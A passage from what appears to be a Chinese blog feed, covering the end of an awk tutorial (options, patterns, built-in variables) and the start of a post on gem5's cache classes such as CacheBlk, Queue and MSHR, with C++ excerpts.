&gt; <span class="hljs-number">5000</span><span class="hljs-punctuation">)</span> print <span class="hljs-variable">$NF</span>&#125;&#x27; test.txt<br><br>例<span class="hljs-number">5</span>：使用 awk 命令计算 exp<span class="hljs-punctuation">(</span><span class="hljs-number">5</span><span class="hljs-punctuation">)</span>：<br>&gt; awk &#x27;BEGIN &#123;<span class="hljs-keyword">param</span> = <span class="hljs-number">5</span>; <span class="hljs-keyword">result</span> = exp<span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span><span class="hljs-punctuation">)</span>; printf <span class="hljs-string">&quot;Result is %f.\n&quot;</span>, <span class="hljs-keyword">result</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><p>awk 有大量的内置变量和内置函数，具体介绍在后小节。</p></li><li><p><strong>对匹配的行执行动作</strong>。awk主要的操作就是print，将数据按规定的格式打印出来。但需要注意，awk 命令一般不直接修改文件，只能将输出信息重定向到某一个文件中（非源文件）。</p></li></ol><center><img src="/img/awk.png" width="80%"/></center><p>可用此图再回顾一下 awk 的四步流程。总结一下，awk 适用于数据文件转换和编制格式报告，并且能做到：1、格式化地输出信息。2、各种复杂的算术逻辑运算和字符串操作。3、配合逐行特性，实现条件和循环结构。</p><h2 id="awk-命令格式和选项">awk 命令格式和选项</h2><h3 id="语法形式">语法形式</h3><p>使用 awk 命令时，一般遵循下面两种形式书写：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">&gt; awk [options] <span class="hljs-string">&#x27;script&#x27;</span> [<span class="hljs-keyword">var</span>=value] [<span class="hljs-keyword">file</span>(s) <span class="hljs-keyword">name</span>]<br>&gt; awk [options] -f scriptfile [<span class="hljs-keyword">var</span>=value] [<span class="hljs-keyword">file</span>(s) <span class="hljs-keyword">name</span>]<br></code></pre></td></tr></table></figure><p>接下来的几个小节开始介绍 awk 各个部分的使用规则：</p><h3 id="常用命令选项-——-options">常用命令选项 —— [options]</h3><ul><li>-F &lt;fs&gt; 或 --field-separator &lt;fs&gt; ：fs 为指定输入分隔符，也可以是字符串或正则表达式。默认的分隔符是连续的空格或制表符</li><li>-v &lt;var&gt;=&lt;value&gt; 赋值一个用户定义变量，将外部变量传递给 awk</li><li>-f &lt;scripfile&gt; 从脚本文件中读取awk命令</li><li>-m[fr] &lt;val]&gt; 对 val 值设置内在限制，-mf选项限制分配给val的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。</li></ul><h3 id="awk-模式和操作-——-‘script’">awk 模式和操作 —— ‘script’</h3><p>首先回顾一下前文所说：</p><blockquote><p>awk 的基本功能是搜索/匹配文件中包含特定<strong>模式</strong>的文本。当其中的内容匹配到了该模式时，awk 会在上执行指定的<strong>操作</strong>。awk 基本以行为处理单元，以这种方式一行一行地处理文本，直到遇到文件的末尾。</p></blockquote><p><strong>模式</strong>和<strong>操作</strong>无疑是 awk 命令中最重要的部分，而它们都会在 ‘script’ 处集中表达，其中</p><h4 id="模式">模式</h4><p>模式可以是以下任意一个：</p><ul><li><p>正则表达式：使用通配符的扩展集。</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">例6：从 employee.txt 文件中找到含有 manager 的行并打印<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">awk <span class="hljs-string">&#x27;/manager/ &#123;print&#125;&#x27;</span> employee.<span class="hljs-property">txt</span> </span><br></code></pre></td></tr></table></figure><p>‘/manager/’ 即要匹配字符串中含有 manager 的子串。找到后打印文件所在行，{print} 默认打印一行的所有列。</p></li><li><p>关系表达式：使用运算符进行操作，可以是字符串或数字的比较测试。</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">例<span class="hljs-number">7</span>：打印 log.txt 中第一列大于<span class="hljs-number">2</span>并且第二列等于 <span class="hljs-string">&#x27;Are&#x27;</span> 的行的前三列：<br>&gt; awk <span class="hljs-string">&#x27;<span class="hljs-subst">$1</span>&gt;2 &amp;&amp; <span class="hljs-subst">$2</span>==&quot;Are&quot; &#123;print <span class="hljs-subst">$1</span>,<span class="hljs-subst">$2</span>,<span class="hljs-subst">$3</span>&#125;&#x27;</span> log.txt<br></code></pre></td></tr></table></figure><p>$1&gt;2 &amp;&amp; $2==“Are” 表示第一列大于2且第二列为 ‘Are’，可以仅写一个条件，也可以完整地写出 if 语句结构，见下例。</p></li><li><p>模式匹配表达式：用运算符~（匹配）和!~（不匹配）。</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">例8：打印 test.txt 文件中第二列，并匹配以80开头并以80结束的行：<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">awk <span class="hljs-string">&#x27;&#123;if ($2 ~ /^80$/) print&#125;&#x27;</span> test.<span class="hljs-property">txt</span></span><br></code></pre></td></tr></table></figure></li><li><p>BEGIN 语句块、pattern 语句块、END 语句块。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">例<span class="hljs-number">9</span>：找到 test.txt 文件中最长行的所占的字符数<br>&gt; awk &#x27;BEGIN&#123;<span class="hljs-built_in">max</span>=<span class="hljs-number">0</span>&#125; &#123;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">length</span>($<span class="hljs-number">0</span>) &gt; <span class="hljs-built_in">max</span>) <span class="hljs-built_in">max</span>=<span class="hljs-built_in">length</span>($<span class="hljs-number">0</span>)&#125; END&#123;<span class="hljs-built_in">print</span> <span class="hljs-built_in">max</span>&#125;&#x27; test.txt<br></code></pre></td></tr></table></figure><p>由三个语句块组成的模式甚至可看成一个简单 C 程序。length() 是 awk 的内置函数。更多函数可见<a href="https://www.runoob.com/w3cnote/awk-built-in-functions.html">菜鸟教程的整理</a></p></li></ul><p>由于 awk 的逐行处理文本的特性，很多重要的全局信息往往通过内置变量表达，在书写 awk 命令时常需要快速查表并使用。限于篇幅不详细介绍内置变量的使用了，不太懂的话可以参考这篇<a href="https://www.zsythink.net/archives/1374">博客</a>：</p><table><thead><tr><th>内置变量</th><th>含义</th></tr></thead><tbody><tr><td>NF</td><td>字段个数，（读取的列数）</td></tr><tr><td>NR</td><td>记录数（行号），从1开始，新的文件延续上面的计数，新文件不从1开始</td></tr><tr><td>FNR</td><td>读取文件的记录数（行号），从1开始，新的文件重新从1开始计数</td></tr><tr><td>FS</td><td>输入字段分隔符，默认是空格</td></tr><tr><td>OFS</td><td>输出字段分隔符 默认也是空格</td></tr><tr><td>RS</td><td>输入行分隔符，默认为换行符</td></tr><tr><td>ORS</td><td>输出行分隔符，默认为换行符</td></tr><tr><td>FILENAME</td><td>输入的文件名</td></tr></tbody></table><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">例<span class="hljs-number">10</span>：读出 <span class="hljs-regexp">/etc/</span>passwd 文件的第三和第四列，并用等号连接打印出来<span class="hljs-operator">。</span><br><span class="hljs-operator">&gt;</span> awk <span class="hljs-operator">-</span><span class="hljs-type">F</span>&#x27;:&#x27; &#x27;<span class="hljs-type">BEGIN</span>&#123;<span class="hljs-type">OFS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;=&quot;</span>;&#125; &#123;print <span class="hljs-variable">$3</span>,<span class="hljs-variable">$4</span>;&#125;&#x27; <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><h4 id="操作">操作</h4><p>操作由一个或多个命令、函数、表达式组成，之间由换行符或分号隔开，并位于大括号内，主要部分是：</p><p>变量或数组赋值<br>输出命令<br>内置函数<br>控制流语句</p><h3 id="awk-的变量-——-var-value">awk 的变量 —— [var=value]</h3><p>除了之前提到的内置变量外，用户在使用 awk 时也可以自定义变量：<code>var=value</code>。当然也可以直接使用 awk 语言定义</p><figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golo">例<span class="hljs-number">11</span>：定义变量<span class="hljs-keyword">var</span>并将其打印出来<br>&gt; awk -v <span class="hljs-keyword">var</span>=<span class="hljs-string">&quot;test&quot;</span> &#x27;BEGIN&#123;<span class="hljs-keyword">print</span> <span class="hljs-keyword">var</span>&#125;&#x27;<br><br>例<span class="hljs-number">12</span>：直接在操作中给变量赋值<br>&gt; awk &#x27;BEGIN&#123;<span class="hljs-keyword">var</span>=<span class="hljs-string">&quot;test&quot;</span>; <span class="hljs-keyword">print</span> <span class="hljs-keyword">var</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><p>回顾例9，变量的设置可以帮助程序员用类C的语法完成更加复杂的任务。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">例<span class="hljs-number">9</span>：找到 test.txt 文件中最长行的所占的字符数<br>&gt; awk &#x27;BEGIN&#123;<span class="hljs-built_in">max</span>=<span class="hljs-number">0</span>&#125; &#123;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">length</span>($<span class="hljs-number">0</span>) &gt; <span class="hljs-built_in">max</span>) <span class="hljs-built_in">max</span>=<span class="hljs-built_in">length</span>($<span class="hljs-number">0</span>)&#125; END&#123;<span class="hljs-built_in">print</span> <span class="hljs-built_in">max</span>&#125;&#x27; test.txt<br></code></pre></td></tr></table></figure><p>awk 常常与其他 shell 指令合用，在传递数据时也需要通过变量：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">例13：读取文件 a.txt 的行数，并用 awk 打印出来<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">num=$(cat a.<span class="hljs-property">txt</span> | wc -l)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">awk -v n=$num <span class="hljs-string">&#x27;BEGIN&#123;print n&#125;&#x27;</span> 或者</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">awk <span class="hljs-string">&#x27;BEGIN&#123;print &#x27;</span><span class="hljs-string">&quot;$num&quot;</span><span class="hljs-string">&#x27;&#125;&#x27;</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Miscellaneous</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解 Gem5 之五</title>
    <link href="/2022/06/18/2022-6-18-gem5-6/"/>
    <url>/2022/06/18/2022-6-18-gem5-6/</url>
    
    <content type="html"><![CDATA[<h1>Gem5 中的 Cache</h1><h2 id="CacheBlock">CacheBlock</h2><h3 id="replaceable-Entry">replaceable Entry</h3><p><code>ReplaceableEntry</code> 类描述了 Cache 中具有可替换功能的基本项。除表示该项在 Cache的位置（特定组和路）外，还包含了指向 <code>ReplacementData</code> 智能指针。注意，在使用 <code>ReplaceableEntry</code> 类之前，必须由 <code>replacement_policy</code> 来将 <code>ReplacementData</code> 实例化。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-comment">/* The replacement data needed by replacement policies. Each replacement policy</span><br><span class="hljs-comment"> *  should have its own implementation of replacement data.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ReplacementData</span> &#123;&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ReplaceableEntry</span> &#123;<br>  <span class="hljs-keyword">protected</span>:<br>    <span class="hljs-comment">// Set &amp; way to which this entry belongs.</span><br>    <span class="hljs-type">uint32_t</span> _set;<br>    <span class="hljs-type">uint32_t</span> _way;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/* Replacement data associated to this entry.</span><br><span class="hljs-comment">     * It must be instantiated by the replacement policy before being used. */</span><br>    std::shared_ptr&lt;replacement_policy::ReplacementData&gt; replacementData;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Tagged-Entry">Tagged Entry</h3><p>TaggedEntry 是包含有 tag 的条目。每个 tag 都附有一个安全 bit，用于标识它是否位于安全地址空间内。TaggedEntry 的内容仅在 valid 位有效时才有意义。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TaggedEntry</span> : <span class="hljs-keyword">public</span> ReplaceableEntry &#123;<br>    <span class="hljs-comment">// Valid bit. The contents of this entry are only valid if it is set.</span><br>    <span class="hljs-type">bool</span> _valid;<br><br>    <span class="hljs-comment">// Secure bit. Marks whether entry&#x27;s address in the secure memory space.</span><br>    <span class="hljs-type">bool</span> _secure;<br><br>    <span class="hljs-comment">/// The entry&#x27;s tag.</span><br>    Addr _tag;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="CacheBlk">CacheBlk</h3><p>CacheBlk 类包含了与一致性、预取状态以及指向其数据指针等相关的信息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheBlk</span> : <span class="hljs-keyword">public</span> TaggedEntry &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// Contains a copy of the data in this block for easy access.</span><br>    <span class="hljs-type">uint8_t</span> *data = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Cache block&#x27;s enum listing the supported coherence bits.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">CoherenceBits</span> : <span class="hljs-type">unsigned</span> &#123;<br>        <span class="hljs-comment">/** write permission */</span><br>        WritableBit =       <span class="hljs-number">0x02</span>,<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Read permission. Note that a block can be valid but not readable</span><br><span class="hljs-comment">         * if there is an outstanding write upgrade miss.</span><br><span class="hljs-comment">         */</span><br>        ReadableBit =       <span class="hljs-number">0x04</span>,<br>        <span class="hljs-comment">/** dirty (modified) */</span><br>        DirtyBit =          <span class="hljs-number">0x08</span>,<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Helper enum value that includes all other bits. Whenever a new</span><br><span class="hljs-comment">         * bits is added, this should be updated.</span><br><span class="hljs-comment">         */</span><br>        AllBits  =          <span class="hljs-number">0x0E</span>,<br>    &#125;;<br>  <span class="hljs-keyword">protected</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Represents that the indicated thread context has a &quot;lock&quot; on</span><br><span class="hljs-comment">     * the block, in the LL/SC sense.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Lock</span> &#123;&#125;;<br><br>    <span class="hljs-comment">/** The current coherence status of this block. */</span><br>    <span class="hljs-type">unsigned</span> coherence;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Queue">Queue</h2><h3 id="QueueEntry">QueueEntry</h3><p><code>QueueEntry</code> 类描述了 <code>Queue</code> 中的基本表项。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">QueueEntry</span> : <span class="hljs-keyword">public</span> Packet::SenderState, <span class="hljs-keyword">public</span> Named &#123;<br>  <span class="hljs-keyword">protected</span>:<br>    <span class="hljs-comment">/** Tick when ready to issue */</span><br>    Tick readyTime;<br>    <span class="hljs-comment">/** True if the entry is uncacheable */</span><br>    <span class="hljs-type">bool</span> _isUncacheable;<br><br>  <span class="hljs-keyword">public</span>:<br>     <span class="hljs-comment">/** True if the entry has been sent downstream. */</span><br>    <span class="hljs-type">bool</span> inService;<br>    <span class="hljs-comment">/** Order number assigned to disambiguate writes and misses. */</span><br>    Counter order;<br>    <span class="hljs-comment">/** Block aligned address. */</span><br>    Addr blkAddr;<br>    <span class="hljs-comment">/** Block size of the cache. */</span><br>    <span class="hljs-type">unsigned</span> blkSize;<br>    <span class="hljs-comment">/** True if the entry targets the secure memory space. */</span><br>    <span class="hljs-type">bool</span> isSecure;<br><br>    <span class="hljs-comment">/* Since multiple references to the same</span><br><span class="hljs-comment">     * address can arrive while a packet is not serviced, each packet is</span><br><span class="hljs-comment">     * stored in a target containing its availability, order and other info,</span><br><span class="hljs-comment">     * and the queue entry stores these similar targets in a list. */</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span> &#123;<br>      <span class="hljs-keyword">public</span>:<br>        <span class="hljs-type">const</span> Tick recvTime;  <span class="hljs-comment">//!&lt; Time when request was received (for stats)</span><br>        <span class="hljs-type">const</span> Tick readyTime; <span class="hljs-comment">//!&lt; Time when request is ready to be serviced</span><br>        <span class="hljs-type">const</span> Counter order;  <span class="hljs-comment">//!&lt; Global order (for memory consistency mgmt)</span><br>        <span class="hljs-type">const</span> PacketPtr pkt;  <span class="hljs-comment">//!&lt; Pending request packet.</span><br>    &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="Queue-2">Queue</h3><p>gem5 中实现了一个高级别的队列接口模板类 <code>Queue</code>，规定队列中只允许放入从 <code>QueueEntry</code> 派生的子类。文章后面我们会了解到，在 <code>Queue</code> 类的基础上，gem5 又分别为 Cache 实现了 MSHR 队列和 Cache 的 Write buffer。可以看出，<code>Queue</code> 在 gem5 的 Cache 系统中显得尤为重要。</p><p>该模板类分别继承父类 <code>Drainable</code> 和 <code>Named</code> 类，它们都在之前的博文中有过介绍。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Entry</span>&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Queue</span> : <span class="hljs-keyword">public</span> Drainable, <span class="hljs-keyword">public</span> Named &#123;<br>  <span class="hljs-keyword">protected</span>:<br>    <span class="hljs-comment">/** Local label (for functional print requests) */</span><br>    <span class="hljs-type">const</span> std::string label;<br><br>    <span class="hljs-comment">/* The total number of entries in this queue. */</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> numEntries;<br><br>    <span class="hljs-comment">/** The number of entries to hold as a temporary overflow space. */</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> numReserve;<br>    <span class="hljs-comment">/**  Actual storage. */</span><br>    std::vector&lt;Entry&gt; entries;<br>    <span class="hljs-comment">/** Holds pointers to all allocated entries. */</span><br>    <span class="hljs-keyword">typename</span> Entry::List allocatedList;<br>    <span class="hljs-comment">/** Holds pointers to entries that haven&#x27;t been sent downstream. */</span><br>    <span class="hljs-keyword">typename</span> Entry::List readyList;<br>    <span class="hljs-comment">/** Holds non allocated entries. */</span><br>    <span class="hljs-keyword">typename</span> Entry::List freeList;<br>    <span class="hljs-comment">/** The number of entries that are in service. */</span><br>    <span class="hljs-type">int</span> _numInService;<br>    <span class="hljs-comment">/** The number of currently allocated entries. */</span><br>    <span class="hljs-type">int</span> allocated;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MSHR">MSHR</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MSHR</span> : <span class="hljs-keyword">public</span> QueueEntry, <span class="hljs-keyword">public</span> Printable &#123;<br>  <span class="hljs-keyword">private</span>:<br><br>    <span class="hljs-comment">/** Flag set by downstream caches */</span><br>    <span class="hljs-type">bool</span> downstreamPending;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Here we use one flag to track both if:</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 1. We are going to become owner or not, i.e., we will get the</span><br><span class="hljs-comment">     * block in an ownership state (Owned or Modified) with BlkDirty</span><br><span class="hljs-comment">     * set. This determines whether or not we are going to become the</span><br><span class="hljs-comment">     * responder and ordering point for future requests that we snoop.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 2. We know that we are going to get a writable block, i.e. we</span><br><span class="hljs-comment">     * will get the block in writable state (Exclusive or Modified</span><br><span class="hljs-comment">     * state) with BlkWritable set. That determines whether additional</span><br><span class="hljs-comment">     * targets with needsWritable set will be able to be satisfied, or</span><br><span class="hljs-comment">     * if not should be put on the deferred list to possibly wait for</span><br><span class="hljs-comment">     * another request that does give us writable access.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * Condition 2 is actually just a shortcut that saves us from</span><br><span class="hljs-comment">     * possibly building a deferred target list and calling</span><br><span class="hljs-comment">     * promoteWritable() every time we get a writable block. Condition</span><br><span class="hljs-comment">     * 1, tracking ownership, is what is important. However, we never</span><br><span class="hljs-comment">     * receive ownership without marking the block dirty, and</span><br><span class="hljs-comment">     * consequently use pendingModified to track both ownership and</span><br><span class="hljs-comment">     * writability rather than having separate pendingDirty and</span><br><span class="hljs-comment">     * pendingWritable flags.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">bool</span> pendingModified;<br><br>    <span class="hljs-comment">/** Did we snoop an invalidate while waiting for data? */</span><br>    <span class="hljs-type">bool</span> postInvalidate;<br><br>    <span class="hljs-comment">/** Did we snoop a read while waiting for data? */</span><br>    <span class="hljs-type">bool</span> postDowngrade;<br><br>  <span class="hljs-keyword">public</span>:<br><br>    <span class="hljs-comment">/** Track if we sent this as a whole line write or not */</span><br>    <span class="hljs-type">bool</span> wasWholeLineWrite;<br><br>    <span class="hljs-comment">/** True if the entry is just a simple forward from an upper level */</span><br>    <span class="hljs-type">bool</span> isForward;<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span> : <span class="hljs-keyword">public</span> QueueEntry::Target<br>    &#123;<br>      <span class="hljs-keyword">public</span>:<br><br>        <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Source</span><br>        &#123;<br>            FromCPU,<br>            FromSnoop,<br>            FromPrefetcher<br>        &#125;;<br><br>        <span class="hljs-type">const</span> Source source;  <span class="hljs-comment">//!&lt; Request from cpu, memory, or prefetcher?</span><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * We use this flag to track whether we have cleared the</span><br><span class="hljs-comment">         * downstreamPending flag for the MSHR of the cache above</span><br><span class="hljs-comment">         * where this packet originates from and guard noninitial</span><br><span class="hljs-comment">         * attempts to clear it.</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * The flag markedPending needs to be updated when the</span><br><span class="hljs-comment">         * TargetList is in service which can be:</span><br><span class="hljs-comment">         * 1) during the Target instantiation if the MSHR is in</span><br><span class="hljs-comment">         * service and the target is not deferred,</span><br><span class="hljs-comment">         * 2) when the MSHR becomes in service if the target is not</span><br><span class="hljs-comment">         * deferred,</span><br><span class="hljs-comment">         * 3) or when the TargetList is promoted (deferredTargets -&gt;</span><br><span class="hljs-comment">         * targets).</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> markedPending;<br><br>        <span class="hljs-type">const</span> <span class="hljs-type">bool</span> allocOnFill;   <span class="hljs-comment">//!&lt; Should the response servicing this</span><br>                                  <span class="hljs-comment">//!&lt; target list allocate in the cache?</span><br>    &#125;;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">TargetList</span> : <span class="hljs-keyword">public</span> std::list&lt;Target&gt;, <span class="hljs-keyword">public</span> Named &#123;<br>      <span class="hljs-keyword">public</span>:<br>        <span class="hljs-type">bool</span> needsWritable;<br>        <span class="hljs-type">bool</span> hasUpgrade;<br>        <span class="hljs-comment">/** Set when the response should allocate on fill */</span><br>        <span class="hljs-type">bool</span> allocOnFill;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Determine whether there was at least one non-snooping</span><br><span class="hljs-comment">         * target coming from another cache.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> hasFromCache;<br>      <span 